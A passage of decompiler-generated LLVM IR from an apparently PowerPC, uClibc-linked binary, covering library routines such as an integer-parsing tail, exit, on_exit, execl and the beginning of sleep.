  %v0_1000f074 = phi i32 [ %v0_1000f068.pre, %dec_label_pc_1000f04c ], [ %v0_1000f064, %dec_label_pc_1000f064 ]
  %v1_1000f070 = phi i32 [ %v2_1000f050, %dec_label_pc_1000f04c ], [ %v1_1000f06c.pre, %dec_label_pc_1000f064 ]
  %v0_1000f0d0 = phi i32 [ 0, %dec_label_pc_1000f04c ], [ %v0_1000f06c.pre, %dec_label_pc_1000f064 ]
  %v1_1000f068 = inttoptr i32 %v0_1000f074 to i8*
  %v2_1000f068 = load i8, i8* %v1_1000f068, align 1
  %v3_1000f068 = zext i8 %v2_1000f068 to i32
  %v3_1000f06c = icmp ugt i32 %v0_1000f0d0, %v1_1000f070
  %v1_1000f074 = add i32 %v0_1000f074, 1
  store i32 %v1_1000f074, i32* %r31.global-to-local, align 4
  %v1_1000f078 = add nsw i32 %v3_1000f068, -48
  %v1_1000f07c = or i32 %v3_1000f068, 32
  %v1_1000f080 = urem i32 %v1_1000f078, 256
  %tmp23 = icmp ult i32 %v1_1000f080, 10
  br i1 %tmp23, label %dec_label_pc_1000f0a0, label %dec_label_pc_1000f090

dec_label_pc_1000f090:                            ; preds = %dec_label_pc_1000f068
  %tmp24 = icmp ult i32 %v1_1000f07c, 97
  br i1 %tmp24, label %dec_label_pc_1000f0a0, label %dec_label_pc_1000f09c

dec_label_pc_1000f09c:                            ; preds = %dec_label_pc_1000f090
  %v1_1000f090 = add nsw i32 %v1_1000f07c, -87
  %v1_1000f09c = urem i32 %v1_1000f090, 256
  br label %dec_label_pc_1000f0a0

dec_label_pc_1000f0a0:                            ; preds = %dec_label_pc_1000f090, %dec_label_pc_1000f068, %dec_label_pc_1000f09c
  %v1_1000f0d4 = phi i32 [ 40, %dec_label_pc_1000f090 ], [ %v1_1000f080, %dec_label_pc_1000f068 ], [ %v1_1000f09c, %dec_label_pc_1000f09c ]
  %v1_1000f0a0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000f0a0 = icmp slt i32 %v1_1000f0d4, %v1_1000f0a0
  br i1 %v2_1000f0a0, label %dec_label_pc_1000f0a8, label %dec_label_pc_1000f0dc

dec_label_pc_1000f0a8:                            ; preds = %dec_label_pc_1000f0a0
  br i1 %v3_1000f06c, label %dec_label_pc_1000f0b8, label %dec_label_pc_1000f0ac

dec_label_pc_1000f0ac:                            ; preds = %dec_label_pc_1000f0a8
  %v1_1000f0ac = load i32, i32* %r27.global-to-local, align 4
  %v0_1000f0b0.not = icmp ne i32 %v0_1000f0d0, %v1_1000f070
  %tmp25 = icmp ule i32 %v1_1000f0d4, %v1_1000f0ac
  %or.cond = or i1 %tmp25, %v0_1000f0b0.not
  br i1 %or.cond, label %dec_label_pc_1000f0d0, label %dec_label_pc_1000f0b8

dec_label_pc_1000f0b8:                            ; preds = %dec_label_pc_1000f0ac, %dec_label_pc_1000f0a8
  %v0_1000f0b8 = call i32 @__errno_location()
  %v0_1000f0bc = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f0bc = load i32, i32* %r26.global-to-local, align 4
  %v2_1000f0bc = and i32 %v1_1000f0bc, %v0_1000f0bc
  store i32 %v2_1000f0bc, i32* %r28.global-to-local, align 4
  store i32 -1, i32* @r8, align 4
  %v2_1000f0c8 = inttoptr i32 %v0_1000f0b8 to i32*
  store i32 34, i32* %v2_1000f0c8, align 4
  %v0_1000f064.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000f06c.pre.pre = load i32, i32* @r8, align 4
  %v1_1000f06c.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f064

dec_label_pc_1000f0d0:                            ; preds = %dec_label_pc_1000f0ac
  %v2_1000f0d0 = mul i32 %v1_1000f0a0, %v0_1000f0d0
  %v2_1000f0d4 = add i32 %v2_1000f0d0, %v1_1000f0d4
  store i32 %v2_1000f0d4, i32* @r8, align 4
  br label %dec_label_pc_1000f064

dec_label_pc_1000f0dc:                            ; preds = %dec_label_pc_1000f0a0, %dec_label_pc_1000f03c
  %v0_1000f0e4 = phi i32 [ %v0_1000f0e414, %dec_label_pc_1000f03c ], [ %v0_1000f0e412, %dec_label_pc_1000f0a0 ]
  %v0_1000f0dc = load i32, i32* %r25.global-to-local, align 4
  %v3_1000f0dc = icmp eq i32 %v0_1000f0dc, 0
  br i1 %v3_1000f0dc, label %dec_label_pc_1000f0e8, label %dec_label_pc_1000f0e4

dec_label_pc_1000f0e4:                            ; preds = %dec_label_pc_1000f0dc
  %v2_1000f0e4 = inttoptr i32 %v0_1000f0dc to i32*
  store i32 %v0_1000f0e4, i32* %v2_1000f0e4, align 4
  br label %dec_label_pc_1000f0e8

dec_label_pc_1000f0e8:                            ; preds = %dec_label_pc_1000f0dc, %dec_label_pc_1000f0e4
  %v0_1000f0e8 = load i32, i32* %r26.global-to-local, align 4
  %v3_1000f0e8 = icmp eq i32 %v0_1000f0e8, 0
  %v0_1000f0ec = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f0ec = sub i32 0, %v0_1000f0ec
  %tmp27 = lshr i32 %v1_1000f0ec, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000f12c.pre.pre = load i32, i32* @r8, align 4
  br i1 %v3_1000f0e8, label %dec_label_pc_1000f11c, label %dec_label_pc_1000f104

dec_label_pc_1000f104:                            ; preds = %dec_label_pc_1000f0e8
  %v3_1000f104 = icmp ugt i32 %v0_1000f12c.pre.pre, %tmp28
  br i1 %v3_1000f104, label %dec_label_pc_1000f10c, label %dec_label_pc_1000f11c

dec_label_pc_1000f10c:                            ; preds = %dec_label_pc_1000f104
  %v0_1000f10c = call i32 @__errno_location()
  %v2_1000f114 = inttoptr i32 %v0_1000f10c to i32*
  store i32 34, i32* %v2_1000f114, align 4
  %v0_1000f118 = load i32, i32* @r31, align 4
  store i32 %v0_1000f118, i32* @r8, align 4
  %v0_1000f11c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000f11c

dec_label_pc_1000f11c:                            ; preds = %dec_label_pc_1000f0e8, %dec_label_pc_1000f104, %dec_label_pc_1000f10c
  %v0_1000f12c.pre = phi i32 [ %v0_1000f12c.pre.pre, %dec_label_pc_1000f104 ], [ %v0_1000f118, %dec_label_pc_1000f10c ], [ %v0_1000f12c.pre.pre, %dec_label_pc_1000f0e8 ]
  %v0_1000f11c = phi i32 [ %v0_1000f0ec, %dec_label_pc_1000f104 ], [ %v0_1000f11c.pre, %dec_label_pc_1000f10c ], [ %v0_1000f0ec, %dec_label_pc_1000f0e8 ]
  %v3_1000f11c = icmp eq i32 %v0_1000f11c, 0
  br i1 %v3_1000f11c, label %dec_label_pc_1000f128, label %dec_label_pc_1000f124

dec_label_pc_1000f124:                            ; preds = %dec_label_pc_1000f11c
  %v1_1000f124 = sub i32 0, %v0_1000f12c.pre
  store i32 %v1_1000f124, i32* @r8, align 4
  br label %dec_label_pc_1000f128

dec_label_pc_1000f128:                            ; preds = %dec_label_pc_1000f11c, %dec_label_pc_1000f124
  %v0_1000f12c = phi i32 [ %v1_1000f124, %dec_label_pc_1000f124 ], [ %v0_1000f12c.pre, %dec_label_pc_1000f11c ]
  ret i32 %v0_1000f12c

; uselistorder directives
  uselistorder i32 %v0_1000f12c.pre, { 1, 0 }
  uselistorder i32 %v0_1000f12c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000f0d4, { 1, 0 }
  uselistorder i32 %v1_1000f080, { 1, 0 }
  uselistorder i32 %v1_1000f07c, { 1, 0 }
  uselistorder i32 %v1_1000f074, { 1, 0 }
  uselistorder i32 %v3_1000f068, { 1, 0 }
  uselistorder i32 %v0_1000f0d0, { 1, 0, 2 }
  uselistorder i32 %v1_1000f070, { 0, 2, 1 }
  uselistorder i32 %v0_1000f064, { 2, 0, 1 }
  uselistorder i32 %v2_1000f050, { 1, 0, 2 }
  uselistorder i32 %v1_1000f028, { 1, 0 }
  uselistorder i32 %v1_1000f014, { 1, 0, 2 }
  uselistorder i32 %v0_1000eff0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 5, 1, 0, 2, 3, 6, 4, 7 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 2147483647, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f128, { 1, 0 }
  uselistorder label %dec_label_pc_1000f11c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f0e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f0a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f068, { 1, 0 }
  uselistorder label %dec_label_pc_1000f03c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eff4, { 1, 0 }
  uselistorder label %dec_label_pc_1000eff0, { 1, 0 }
  uselistorder label %dec_label_pc_1000efbc, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000f158 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000f170 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002eebc.448 to i32))
  store i32 268497276, i32* @lr, align 4
  %v1_1000f178 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eebc.448 to i32))
  %v3_1000f180 = load i32, i32* @global_var_1002f064.449, align 4
  %v3_1000f184 = icmp eq i32 %v3_1000f180, 0
  br i1 %v3_1000f184, label %dec_label_pc_1000f198, label %dec_label_pc_1000f18c

dec_label_pc_1000f18c:                            ; preds = %entry
  %v1_1000f194 = call i32 @unknown_0()
  br label %dec_label_pc_1000f198

dec_label_pc_1000f198:                            ; preds = %entry, %dec_label_pc_1000f18c
  store i32 %v2_1000f158, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000f1a4.450 to i32), i32* @lr, align 4
  %v0_1000f1a0 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_1000f1a0, i32* @r3, align 4
  store i32 268497320, i32* @lr, align 4
  %v1_1000f1a4 = call i32 @__GI___uClibc_fini(i32 %v0_1000f1a0)
  br i1 icmp eq (i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -18464), i32 0), label %dec_label_pc_1000f1bc, label %dec_label_pc_1000f1b8

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f198
  store i32 268497340, i32* @lr, align 4
  %v2_1000f1b8 = call i32 @_stdio_term(i32 %v1_1000f1a4, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -18464))
  br label %dec_label_pc_1000f1bc

dec_label_pc_1000f1bc:                            ; preds = %dec_label_pc_1000f198, %dec_label_pc_1000f1b8
  %v0_1000f1bc = load i32, i32* @r31, align 4
  %v1_1000f1c0 = call i32 @__GI__exit(i32 %v0_1000f1bc)
  ret i32 %v1_1000f1c0

; uselistorder directives
  uselistorder label %dec_label_pc_1000f1bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f198, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000f1c4 = load i32, i32* @lr, align 4
  store i32 %v0_1000f1c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f1e0.451 to i32), i32* @lr, align 4
  %v0_1000f1dc = call i32 @__new_exitfn()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v3_1000f1e4 = icmp eq i32 %v0_1000f1dc, 0
  br i1 %v3_1000f1e4, label %dec_label_pc_1000f200, label %dec_label_pc_1000f1ec

dec_label_pc_1000f1ec:                            ; preds = %entry
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000f1f0 = load i32, i32* @r31, align 4
  %v2_1000f1f0 = add i32 %v0_1000f1dc, 4
  %v3_1000f1f0 = inttoptr i32 %v2_1000f1f0 to i32*
  store i32 %v0_1000f1f0, i32* %v3_1000f1f0, align 4
  %v0_1000f1f4 = load i32, i32* @r30, align 4
  %v2_1000f1f4 = add i32 %v0_1000f1dc, 8
  %v3_1000f1f4 = inttoptr i32 %v2_1000f1f4 to i32*
  store i32 %v0_1000f1f4, i32* %v3_1000f1f4, align 4
  %v0_1000f1f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f1f8 = inttoptr i32 %v0_1000f1dc to i32*
  store i32 %v0_1000f1f8, i32* %v2_1000f1f8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f200

dec_label_pc_1000f200:                            ; preds = %entry, %dec_label_pc_1000f1ec
  %v0_1000f200 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000f1ec ]
  store i32 %v0_1000f1c4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000f200

; uselistorder directives
  uselistorder i32 %v0_1000f1dc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000f200, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000f218 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000f234 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000f234, i32* %r0.global-to-local, align 4
  %v2_1000f23c = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000f234, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f268

dec_label_pc_1000f268:                            ; preds = %dec_label_pc_1000f298, %entry
  %v0_1000f26c = phi i32 [ 0, %entry ], [ %v1_1000f26c, %dec_label_pc_1000f298 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000f23c, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000f298 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000f298 ]
  %v4_1000f268 = zext i8 %stack_var_-56.0 to i32
  %v1_1000f26c = add i32 %v0_1000f26c, 1
  %v1_1000f274 = mul nuw nsw i32 %v4_1000f268, 4
  store i32 %v1_1000f274, i32* %r0.global-to-local, align 4
  %v2_1000f278 = add i32 %v1_1000f274, %v2_1000f234
  store i32 %v2_1000f278, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000f28c, label %dec_label_pc_1000f284

dec_label_pc_1000f284:                            ; preds = %dec_label_pc_1000f268
  %v1_1000f27c = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000f298

dec_label_pc_1000f28c:                            ; preds = %dec_label_pc_1000f268
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000f290 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000f290, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f298

dec_label_pc_1000f298:                            ; preds = %dec_label_pc_1000f284, %dec_label_pc_1000f28c
  %stack_var_-52.1 = phi i32 [ %v1_1000f290, %dec_label_pc_1000f28c ], [ %stack_var_-52.0, %dec_label_pc_1000f284 ]
  %v0_1000f298 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000f28c ], [ %v2_1000f278, %dec_label_pc_1000f284 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000f28c ], [ %v1_1000f27c, %dec_label_pc_1000f284 ]
  %v1_1000f298 = inttoptr i32 %v0_1000f298 to i32*
  %v2_1000f298 = load i32, i32* %v1_1000f298, align 4
  store i32 %v2_1000f298, i32* %r0.global-to-local, align 4
  %v3_1000f29c = icmp eq i32 %v2_1000f298, 0
  br i1 %v3_1000f29c, label %dec_label_pc_1000f2a4, label %dec_label_pc_1000f268

dec_label_pc_1000f2a4:                            ; preds = %dec_label_pc_1000f298
  %v1_1000f2a4 = mul i32 %v1_1000f26c, 4
  store i32 %v4_1000f218, i32* %r0.global-to-local, align 4
  %v1_1000f2ac = add i32 %v1_1000f2a4, 34
  store i32 %v1_1000f26c, i32* %ctr.global-to-local, align 4
  %v1_1000f2b4 = call i32 @__asm_rlwinm(i32 %v1_1000f2ac, i32 0, i32 0, i32 27)
  %v1_1000f2bc = load i32, i32* @r1, align 4
  %v3_1000f2bc = sub i32 %v1_1000f2bc, %v1_1000f2b4
  %v4_1000f2bc = inttoptr i32 %v3_1000f2bc to i32*
  store i32 %v4_1000f218, i32* %v4_1000f2bc, align 4
  %v1_1000f2c0 = add i32 %v3_1000f2bc, 23
  store i32 %v1_1000f2c0, i32* %r0.global-to-local, align 4
  %v1_1000f2c4 = call i32 @__asm_rlwinm(i32 %v1_1000f2c0, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000f2cc = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f2cc = inttoptr i32 %v1_1000f2c4 to i32*
  store i32 %v0_1000f2cc, i32* %v2_1000f2cc, align 4
  store i32 %v1_1000f2c4, i32* %r11.global-to-local, align 4
  %v0_1000f2d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f2d4 = trunc i32 %v0_1000f2d4 to i8
  store i32 %v2_1000f234, i32* %r0.global-to-local, align 4
  store i32 %v2_1000f234, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000f2e8

dec_label_pc_1000f2e8:                            ; preds = %dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge, %dec_label_pc_1000f2a4
  %v0_1000f2ec = phi i32 [ %v1_1000f2c4, %dec_label_pc_1000f2a4 ], [ %v0_1000f2ec.pre, %dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000f23c, %dec_label_pc_1000f2a4 ], [ %stack_var_-52.3, %dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000f2d4, %dec_label_pc_1000f2a4 ], [ %stack_var_-56.3, %dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge ]
  %v1_1000f2ec = add i32 %v0_1000f2ec, 4
  store i32 %v1_1000f2ec, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000f310, label %dec_label_pc_1000f300

dec_label_pc_1000f300:                            ; preds = %dec_label_pc_1000f2e8
  %v4_1000f2e8 = zext i8 %stack_var_-56.2 to i32
  %v1_1000f2f8 = add i8 %stack_var_-56.2, 1
  %v1_1000f2f4 = mul nuw nsw i32 %v4_1000f2e8, 4
  %v3_1000f300 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000f300, i32* %r0.global-to-local, align 4
  %v2_1000f308 = add i32 %v3_1000f300, %v1_1000f2f4
  br label %dec_label_pc_1000f31c

dec_label_pc_1000f310:                            ; preds = %dec_label_pc_1000f2e8
  %v1_1000f314 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000f314, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f31c

dec_label_pc_1000f31c:                            ; preds = %dec_label_pc_1000f300, %dec_label_pc_1000f310
  %stack_var_-52.3 = phi i32 [ %v1_1000f314, %dec_label_pc_1000f310 ], [ %stack_var_-52.2, %dec_label_pc_1000f300 ]
  %v0_1000f31c = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000f310 ], [ %v2_1000f308, %dec_label_pc_1000f300 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000f310 ], [ %v1_1000f2f8, %dec_label_pc_1000f300 ]
  %v1_1000f31c = inttoptr i32 %v0_1000f31c to i32*
  %v2_1000f31c = load i32, i32* %v1_1000f31c, align 4
  store i32 %v2_1000f31c, i32* %r0.global-to-local, align 4
  %v2_1000f320 = inttoptr i32 %v1_1000f2ec to i32*
  store i32 %v2_1000f31c, i32* %v2_1000f320, align 4
  %v0_1000f324 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f324 = add i32 %v0_1000f324, -1
  store i32 %v1_1000f324, i32* %ctr.global-to-local, align 4
  %v2_1000f324 = icmp eq i32 %v1_1000f324, 0
  br i1 %v2_1000f324, label %dec_label_pc_1000f328, label %dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge

dec_label_pc_1000f31c.dec_label_pc_1000f2e8_crit_edge: ; preds = %dec_label_pc_1000f31c
  %v0_1000f2ec.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000f2e8

dec_label_pc_1000f328:                            ; preds = %dec_label_pc_1000f31c
  %v3_1000f32c = load i32, i32* @global_var_1002f070.452, align 4
  store i32 268497716, i32* @lr, align 4
  %v2_1000f330 = call i32 @__GI_execve(i32 %v3_1000f32c, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v0_1000f334 = load i32, i32* @r1, align 4
  %v1_1000f334 = inttoptr i32 %v0_1000f334 to i32*
  %v2_1000f334 = load i32, i32* %v1_1000f334, align 4
  store i32 %v2_1000f334, i32* %r11.global-to-local, align 4
  %v1_1000f338 = add i32 %v2_1000f334, 4
  %v2_1000f338 = inttoptr i32 %v1_1000f338 to i32*
  %v3_1000f338 = load i32, i32* %v2_1000f338, align 4
  store i32 %v3_1000f338, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000f330

; uselistorder directives
  uselistorder i32 %v1_1000f324, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000f274, { 1, 0 }
  uselistorder i32 %v1_1000f26c, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000f234, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i8 1, { 0, 1, 7, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 3, 18, 19, 20, 21, 4, 5, 6, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder label %dec_label_pc_1000f31c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f298, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* @r8, align 4
  %v3_1000f34c = icmp eq i32 %arg1, 0
  br i1 %v3_1000f34c, label %dec_label_pc_1000f500, label %dec_label_pc_1000f37c.lr.ph

dec_label_pc_1000f37c.lr.ph:                      ; preds = %entry
  %v2_1000f370 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000f370, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000f37c42 = add i32 %v2_1000f370, 132
  %v3_1000f37c43 = inttoptr i32 %v2_1000f37c42 to i32*
  store i32 0, i32* %v3_1000f37c43, align 4
  %v0_1000f38044 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f38045 = add i32 %v0_1000f38044, -1
  store i32 %v1_1000f38045, i32* %r11.global-to-local, align 4
  %v1_1000f38446 = mul i32 %v1_1000f38045, 4
  %v1_1000f38847 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f38848 = add i32 %v1_1000f38847, %v1_1000f38446
  %v0_1000f38c49 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f38c50 = add i32 %v0_1000f38c49, -1
  store i32 %v1_1000f38c50, i32* %ctr.global-to-local, align 4
  %v2_1000f38c51 = icmp eq i32 %v1_1000f38c50, 0
  br i1 %v2_1000f38c51, label %dec_label_pc_1000f390, label %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge

dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge: ; preds = %dec_label_pc_1000f37c.lr.ph, %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge
  %v2_1000f38852 = phi i32 [ %v2_1000f388, %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge ], [ %v2_1000f38848, %dec_label_pc_1000f37c.lr.ph ]
  %v0_1000f37c.pre = load i32, i32* @r10, align 4
  %v2_1000f37c = add i32 %v2_1000f38852, 8
  %v3_1000f37c = inttoptr i32 %v2_1000f37c to i32*
  store i32 %v0_1000f37c.pre, i32* %v3_1000f37c, align 4
  %v0_1000f380 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f380 = add i32 %v0_1000f380, -1
  store i32 %v1_1000f380, i32* %r11.global-to-local, align 4
  %v1_1000f384 = mul i32 %v1_1000f380, 4
  %v1_1000f388 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000f388 = add i32 %v1_1000f388, %v1_1000f384
  %v0_1000f38c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f38c = add i32 %v0_1000f38c, -1
  store i32 %v1_1000f38c, i32* %ctr.global-to-local, align 4
  %v2_1000f38c = icmp eq i32 %v1_1000f38c, 0
  br i1 %v2_1000f38c, label %dec_label_pc_1000f390, label %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge

dec_label_pc_1000f390:                            ; preds = %dec_label_pc_1000f37c.dec_label_pc_1000f37c_crit_edge, %dec_label_pc_1000f37c.lr.ph
  %v0_1000f3a4.pre = load i32, i32* @r8, align 4
  %v2_1000f390 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000f390, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f390, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000f3a4.pre, i32* %stack_var_-440, align 4
  %v0_1000f3a8 = call i32 @__sigaddset()
  store i32 %v0_1000f3a8, i32* %r3.global-to-local, align 4
  %v1_1000f3ac = icmp slt i32 %v0_1000f3a8, 0
  br i1 %v1_1000f3ac, label %dec_label_pc_1000f508, label %dec_label_pc_1000f3b4

dec_label_pc_1000f3b4:                            ; preds = %dec_label_pc_1000f390
  %v2_1000f3b4 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268497864, i32* @lr, align 4
  %v3_1000f3c4 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000f390, i32 %v2_1000f3b4)
  store i32 %v3_1000f3c4, i32* %r3.global-to-local, align 4
  %v3_1000f3c8 = icmp eq i32 %v3_1000f3c4, 0
  br i1 %v3_1000f3c8, label %dec_label_pc_1000f3d0, label %dec_label_pc_1000f508

dec_label_pc_1000f3d0:                            ; preds = %dec_label_pc_1000f3b4
  store i32 %v2_1000f3b4, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000f3d8 = call i32 @__sigismember()
  store i32 %v0_1000f3d8, i32* %r3.global-to-local, align 4
  %v3_1000f3dc = icmp eq i32 %v0_1000f3d8, 0
  br i1 %v3_1000f3dc, label %dec_label_pc_1000f3fc.lr.ph, label %dec_label_pc_1000f4c8

dec_label_pc_1000f3fc.lr.ph:                      ; preds = %dec_label_pc_1000f3d0
  store i32 %v2_1000f370, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000f37c43, align 4
  %v0_1000f40033 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f40034 = add i32 %v0_1000f40033, -1
  store i32 %v1_1000f40034, i32* %r11.global-to-local, align 4
  %v1_1000f40435 = mul i32 %v1_1000f40034, 4
  %v1_1000f40836 = load i32, i32* @r8, align 4
  %v2_1000f40837 = add i32 %v1_1000f40836, %v1_1000f40435
  %v0_1000f40c38 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f40c39 = add i32 %v0_1000f40c38, -1
  store i32 %v1_1000f40c39, i32* %ctr.global-to-local, align 4
  %v2_1000f40c40 = icmp eq i32 %v1_1000f40c39, 0
  br i1 %v2_1000f40c40, label %dec_label_pc_1000f410, label %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge

dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge: ; preds = %dec_label_pc_1000f3fc.lr.ph, %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge
  %v2_1000f40841 = phi i32 [ %v2_1000f408, %dec_label_pc_1000f3fc.dec_label_pc_1000f3fc_crit_edge ], [ %v2_1000f40837, %dec_label_pc_1000f3fc.lr.ph ]
  %v0_1000f3fc.pre = load i32, i32* @r10, align 4
